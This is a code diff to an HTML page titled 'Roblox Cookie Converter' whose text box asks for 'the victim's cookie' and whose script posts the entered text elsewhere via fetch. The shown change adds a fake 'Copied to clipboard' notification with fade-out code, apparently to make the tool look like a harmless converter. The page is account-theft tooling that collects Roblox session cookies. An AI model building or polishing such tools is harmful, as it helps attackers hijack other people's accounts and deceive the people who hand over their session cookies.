@@ -48,12 +48,31 @@
       #sendButton:hover {
         background-color: #001a40;
       }
+
+      #notification {
+        position: fixed;
+        bottom: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background-color: #333;
+        color: white;
+        font-size: 20px;
+        padding: 10px 20px;
+        border-radius: 5px;
+        display: none;
+        font-family: Arial, sans-serif;
+        font-weight: bold;
+        transition: opacity 0.5s ease-in-out;
+        background-color: #444;
+        opacity: 1;
+      }
     </style>
   </head>
   <body>
     <div id="title">🤖 Roblox Cookie Converter 🚀</div>
     <textarea id="message" placeholder="Type the victim's cookie here..."></textarea><br>
     <button id="sendButton">Convert</button>
+    <div id="notification">Copied to clipboard</div>
     <script>
       function sendMessage() {
         const message = document.getElementById("message").value;
@@ -68,6 +87,18 @@
         })
           .then((response) => console.log(response))
           .catch((error) => console.error(error));
+
+        // Show notification
+        const notification = document.getElementById("notification");
+        notification.style.display = "block";
+
+        // Fade out notification after 2 seconds
+        setTimeout(() => {
+          notification.style.opacity = 0;
+          setTimeout(() => {
+            notification.style.display = "none";
+          }, 500);
+        }, 2000);
       }
 
       document.getElementById("sendButton").addEventListener("click", sendMessage);
